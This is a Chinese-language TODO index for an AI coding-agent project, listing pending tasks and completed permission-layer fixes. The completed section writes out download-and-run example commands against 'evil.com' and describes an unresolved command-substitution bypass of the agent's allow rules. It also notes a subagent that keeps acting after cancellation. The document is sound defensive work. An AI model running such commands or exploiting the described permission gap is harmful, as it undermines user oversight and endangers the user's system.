# TODO —— 待选方向

**这个文件夹里的文档是「做完就删」的临时提醒**，不是长期设计资料。
每份都自带一段可一键复制的 Prompt，在新 session 里粘贴即可开工。

**每段 Prompt 都以分支检查开头**：先 `git branch --show-current`，
在 `main` 上就先起新分支再动手。建议分支名见下表，也写在各文档抬头与 Prompt 里。

## 命名规则

**文件名的数字前缀就是优先级，越小越优先。** 新增 TODO 时**重排全部序号**
（新事项可能插在中间），不是简单追加到末尾。重排用 `git mv` 保住历史，
并同步本文件的清单。

## 当前清单

| 优先级 | 事项 | 建议分支 | 复杂度 | 一句话 |
| --- | --- | --- | --- | --- |
| [1](1-subagent-cancel-semantics.md) | **`Esc` 不取消正在跑的子 Agent** | `subagent-cancel-semantics` | 小（实现半天，**但要先定语义**） | 按 `Esc` 只停主循环，子 Agent 又跑了 7 轮、写文件、提交、留下一个工作区。隔离场景下不致命，**非隔离场景下它还在往主项目根写**。改法牵动 C13「委派永不阻塞」的契约 |
| [2](2-subagent-e2e-timing-flaky.md) | **子 Agent 端到端的时间断言偶发红** | `subagent-e2e-timing-flaky` | 小（半天） | 两条用挂钟时间做判据的用例在全量并发下偶发失败，单跑必过。**问题不是它红，是它偶尔红**——那会训练所有人忽略失败。⚠ 别调大阈值（只降低概率、且再也验不出真的阻塞），改成事件同步 |
| [3](3-skill-recall-eval.md) | Skill 召回率评测闭环 | `skill-recall-eval` | 中（2–4 天） | 刚改了一轮「Skill 写对了却没被加载」，但**召回率仍只能靠感觉判断**。官方有成型做法，我们的驱动设施已齐，缺「批量跑 + 统计」这一层 |
| [4](4-team-adoption.md) | **模型不会主动组队** | `team-adoption` | 中（**先测量再决定改不改**） | C15 的协作机制好用——明说「组个队」它一次就做对；但两轮自然场景它都自己做完了。⚠ **开工第一步不是改代码，是换强模型跑对照**——验收全程用的是快速小模型，这一项没被排除。与第 3 条同源，评测闭环可复用 |
| [5](5-web-search.md) | 网络搜索工具 | `web-search` | 中（1–2 天） | web_fetch 的另一半：现在模型只能「上网取」不能「上网找」。**权限管线现成，难点全在「往外发的是什么」** |
| [6](6-worktree-link-sandbox.md) | 让 `worktree.link` 真正可用 | `worktree-link-sandbox` | 中（**要走 /spec**） | `link` 建出来的软链被第②层沙箱一律拒绝，现已止血为「降级成 copy + 留痕」。要真正可用得动第②层边界判定——**开工前先确认有没有真实需求**，现在的降级行为是诚实的 |
| [7](7-p1b-unattended.md) | P1b 无人值守回归 | `p1b-unattended` | 大（多天） | 代码不难，**难在取样方法** —— 做不好会把偏了的取样固化成回归测试 |

**一组同源事项，建议成对处理**：`3 + 4` 都是「模型欠触发」的评测问题
（第 3 条建好的闭环，第 4 条能直接复用）。

## 与 CLAUDE.md「已知后续工程项」的分工

| | 是什么 | 特点 |
| --- | --- | --- |
| `docs/todo/`（本文件夹） | **近期待选** —— 随时可能挑来做的下一件事 | 带 Prompt 与可执行细节，做完即删 |
| CLAUDE.md「已知后续工程项」 | **长期登记** —— spec 明确不做的、跨章节的工程债 | 只登记不催办，长期保留 |

同一件事可以两边都有，但这里那份要能直接开工。

## 已完成（已从本文件夹移除）

- ~~`system_serial` 的工具绕过③规则层~~ + ~~allow 的末尾通配跨分隔符~~ ——
  `perm-system-serial-bypass` 分支，**两条一起做、一起评审**（都在③规则层上）。
  兑现了 CLAUDE.md 已知项 #18 与 #12 的 allow 半边：
  ① 七个 `system_serial` 工具现在照常过 `engine.decide`，`deny: run_agent` 真的
  生效了，但**判 ASK 时按 ALLOW 处理**以保住「不弹面板」这条既有性质；
  ② allow 命令规则改为「每一段都得命中」，`allow: Bash(git *)` 不再整串放行
  `git status && curl evil.com | sh`。
  两条评审决定：allow 侧单用**认引号**的拆分（收紧侧逐字不变，否则等于放宽①黑名单）、
  allow 允许**跨规则**覆盖各段（否则 `allow: Bash(git *)` + `allow: Bash(ls *)`
  会让 `ls && git status` 开始弹面板）。
  ⚠ **仍未解决**：基于分隔符的拆分看不见命令替换，`git status $(curl evil.com)`
  照样整条放行——要解决得真正解析 shell 语法，与已知项 #4 同源，未单独立项
- ~~③规则层对复合命令不拆段（deny 侧）~~ —— `perm-compound-command` 分支，
  兑现了 CLAUDE.md 已知项 #12 的 deny 半边：deny 命令规则改为「整条 + 逐段」，
  判定形态提到 `permission/matching.py` 的 `match_command_deep` 与 Hook 侧共用。
  **allow 侧没有一起修**——实施期发现那边的真正病根不是「拆不拆段」而是
  「末尾通配跨分隔符」，方向与 deny 相反、要单独评审——**已于 `perm-system-serial-bypass` 一并修完**（见上一条）
- ~~清 `dropped_fatal` 死代码~~ —— `maintenance-1` 分支，已知项 #12
- ~~保留区与余量随窗口缩放~~ —— `maintenance-1` 分支，已知项 #8
- ~~Plan Mode 规划阶段工具阶段强校验~~ —— `maintenance-1` 分支，已知项 #2
- ~~CLAUDE.md 测试章精简~~ —— `maintenance-1` 分支
- ~~网络访问工具~~ —— `web-tool` 分支，走完整 /spec 流程（五轮独立审查、七轮修订），文档留在 `docs/extensions/web-fetch/`，兑现了 CLAUDE.md 已知项 #5 的「网络请求限制」。**它的另一半（web_search）已登记为本清单第 5 条**
- ~~C15 子 Agent 协作~~ —— `c15` 分支，PR #20 已合并进 main。走完整 /spec 流程，
  真实模型验收抓出 **6 个产品问题**（全部已修）。两个未修的遗留里，
  「allow 通配跨分隔符」已随 `perm-system-serial-bypass` 修完，
  「模型不会主动组队」是本清单第 4 条。文档在 `docs/c15/`，验收记录在 `docs/c15/acceptance/live-model.md`
- ~~Skill 作者期~~ —— `skill-authoring` 分支，走完整 /spec 流程（一轮独立审查，查出两条阻塞：预授权过宽判定对 MCP 工具必然误报且**给出的改法会静默破坏用户配置**、以及 spec 一度承诺的「创建到用户级」被第②层沙箱物理挡死）。文档留在 `docs/extensions/skill-authoring/`。它是**唯一由真实使用暴露**的缺口——此前 C11 的 43/43 判据全部建立在「已经有一份写好的 Skill」这个前提上
